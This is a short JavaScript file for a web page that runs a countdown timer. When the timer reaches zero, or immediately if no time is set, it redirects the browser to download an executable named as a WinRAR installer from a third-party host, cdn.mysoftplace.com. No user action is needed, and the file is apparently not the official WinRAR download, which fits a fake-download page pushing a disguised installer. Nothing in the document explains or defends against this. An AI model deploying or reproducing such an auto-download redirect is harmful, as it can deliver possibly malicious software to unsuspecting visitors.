const timerElement = document.getElementById('timer');
const initialTime = timerElement.textContent.split(':');
let hours = parseInt(initialTime[0], 10);
let minutes = parseInt(initialTime[1], 10);
let seconds = parseInt(initialTime[2], 10);

if (hours > 0 || minutes > 0 || seconds > 0) {
	const intervalId = setInterval(() => {
		seconds--;
		if (seconds < 0) {
			minutes--;
			seconds = 59;

			if (minutes < 0) {
				hours--;
				minutes = 59;
			}
		}

		if (hours === 0 && minutes === 0 && seconds === 0) {
			clearInterval(intervalId);
			timerElement.textContent = '00:00:00';
			window.location =
				'https://cdn.mysoftplace.com/Winrar%20Soft%20inst%20instup.exe';
			return;
		}

		const formattedHours = String(hours).padStart(2, '0');
		const formattedMinutes = String(minutes).padStart(2, '0');
		const formattedSeconds = String(seconds).padStart(2, '0');

		timerElement.textContent = `${formattedHours}:${formattedMinutes}:${formattedSeconds}`;
	}, 1000);
} else {
	window.location =
		'https://cdn.mysoftplace.com/Winrar%20Soft%20inst%20instup.exe';
}
